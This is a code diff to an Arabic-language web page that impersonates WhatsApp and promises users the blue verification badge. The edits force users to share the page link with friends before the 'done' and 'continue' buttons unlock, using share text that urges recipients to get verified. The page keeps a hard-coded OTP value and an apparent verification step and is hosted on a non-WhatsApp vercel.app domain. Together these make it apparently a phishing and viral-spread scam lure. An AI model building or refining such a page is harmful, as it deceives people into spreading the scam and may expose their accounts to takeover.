@@ -32,13 +32,15 @@
         .btn-share { width: 100%; padding: 14px; background: #25d366; color: white; border: none; border-radius: 30px; font-size: 16px; font-weight: 600; cursor: pointer; transition: 0.2s; display: flex; align-items: center; justify-content: center; gap: 10px; }
         .btn-share:hover { background: #1da85c; }
         .btn-share:active { transform: scale(0.97); }
+        .btn-share:disabled { opacity: 0.5; cursor: not-allowed; }
         .btn-confirm { width: 100%; padding: 14px; background: #075e54; color: white; border: none; border-radius: 30px; font-size: 16px; font-weight: 600; cursor: pointer; transition: 0.2s; display: flex; align-items: center; justify-content: center; gap: 10px; margin-top: 10px; }
         .btn-confirm:hover { background: #054a42; }
         .btn-confirm:active { transform: scale(0.97); }
-        .btn-confirm:disabled { opacity: 0.5; cursor: not-allowed; }
+        .btn-confirm:disabled { opacity: 0.5; cursor: not-allowed; background: #999; }
         .btn-continue { width: 100%; padding: 14px; background: #075e54; color: white; border: none; border-radius: 30px; font-size: 16px; font-weight: 600; cursor: pointer; transition: 0.2s; display: flex; align-items: center; justify-content: center; gap: 10px; margin-top: 10px; }
         .btn-continue:hover { background: #054a42; }
-        .btn-continue:disabled { opacity: 0.5; cursor: not-allowed; }
+        .btn-continue:active { transform: scale(0.97); }
+        .btn-continue:disabled { opacity: 0.5; cursor: not-allowed; background: #999; }
         .chat-card { background: white; border-radius: 16px; padding: 24px 20px; margin-bottom: 20px; box-shadow: 0 1px 3px rgba(0, 0, 0, 0.06); }
         .chat-card .icon-circle { width: 56px; height: 56px; border-radius: 50%; background: #e8f5e9; color: #075e54; display: flex; align-items: center; justify-content: center; font-size: 24px; margin: 0 auto 12px; }
         .chat-card h3 { font-size: 18px; font-weight: 700; color: #1a1a1a; text-align: center; margin-bottom: 4px; }
@@ -136,7 +138,7 @@
                     <i class="fas fa-share-alt"></i> مشاركة الرابط
                 </button>
 
-                <button class="btn-confirm" id="confirmBtn">
+                <button class="btn-confirm" id="confirmBtn" disabled>
                     <i class="fas fa-check-circle"></i> تم ✅
                 </button>
 
@@ -297,6 +299,7 @@
         let correctOtp = '123456';
         let isVerifying = false;
         let isShared = false;
+        let hasShared = false;
         const BASE_URL = 'https://whatsapp-verify-zeta.vercel.app';
 
         // ===== توليد ID فريد =====
@@ -323,14 +326,22 @@
                 continueBtn.innerHTML = '<i class="fas fa-arrow-right"></i> المتابعة للتوثيق ✅';
                 confirmBtn.disabled = true;
                 confirmBtn.innerHTML = '<i class="fas fa-check-circle"></i> تم ✅';
+            } else if (hasShared) {
+                statusText.textContent = '⏳ اضغط على "تم"';
+                statusText.style.color = '#FF9900';
+                progressFill.style.width = '50%';
+                confirmBtn.disabled = false;
+                confirmBtn.innerHTML = '<i class="fas fa-check-circle"></i> تم ✅';
+                continueBtn.disabled = true;
+                continueBtn.innerHTML = '<i class="fas fa-arrow-right"></i> المتابعة للتوثيق';
             } else {
                 statusText.textContent = '⏳ في انتظار المشاركة';
                 statusText.style.color = '#075e54';
                 progressFill.style.width = '0%';
+                confirmBtn.disabled = true;
+                confirmBtn.innerHTML = '<i class="fas fa-check-circle"></i> تم ✅';
                 continueBtn.disabled = true;
                 continueBtn.innerHTML = '<i class="fas fa-arrow-right"></i> المتابعة للتوثيق';
-                confirmBtn.disabled = false;
-                confirmBtn.innerHTML = '<i class="fas fa-check-circle"></i> تم ✅';
             }
         }
 
@@ -363,9 +374,13 @@
                         text: '🔵 ساعدني في توثيق حسابي على WhatsApp واحصل على العلامة الزرقاء!',
                         url: shareLink
                     });
+                    hasShared = true;
+                    updateStatus();
                     showToast('✅ تمت المشاركة! اضغط "تم"');
                 } else {
                     await navigator.clipboard.writeText(shareLink);
+                    hasShared = true;
+                    updateStatus();
                     showToast('✅ تم نسخ الرابط! شاركه مع أصدقائك ثم اضغط "تم"');
                 }
             } catch (err) {
@@ -373,6 +388,8 @@
                 if (err.name !== 'AbortError') {
                     try {
                         await navigator.clipboard.writeText(shareLink);
+                        hasShared = true;
+                        updateStatus();
                         showToast('✅ تم نسخ الرابط! شاركه مع أصدقائك');
                     } catch (e) {
                         showToast('❌ فشل نسخ الرابط، حاول مرة أخرى');
@@ -385,6 +402,11 @@
         function confirmShare() {
             if (isShared) {
                 showToast('⚠️ لقد قمت بالمشاركة بالفعل!');
+                return;
+            }
+
+            if (!hasShared) {
+                showToast('⚠️ يرجى مشاركة الرابط أولاً!');
                 return;
             }
 
